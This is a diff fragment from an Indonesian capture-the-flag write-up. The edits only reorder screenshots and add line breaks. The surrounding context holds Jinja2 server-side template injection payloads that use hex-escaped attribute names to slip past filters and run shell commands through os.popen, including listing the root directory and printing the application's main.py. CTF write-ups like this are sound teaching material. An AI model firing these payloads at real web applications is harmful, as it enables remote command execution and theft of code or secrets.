@@ -35,13 +35,15 @@ Berikut adalah link repo segala payload yang kami gunakan untuk melakukan bypass
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
 
-![6](img/6.png)
+<br/>
+
+![7](img/7.png)
 
 ```
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls /')|attr('read')()}}
 ```
 
-![7](img/7.png)
+<br/>
 
 Dapat dibuktikan bahwa payload tersebut telah berhasil dieksekusi, oleh karena itu tinggal cari flag dan baca isi file saja.
 
@@ -50,6 +52,8 @@ Dapat dibuktikan bahwa payload tersebut telah berhasil dieksekusi, oleh karena i
 ```
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /app/main.py')|attr('read')()}}
 ```
+
+<br/>
 
 Penyelesaian dengan Solver
 
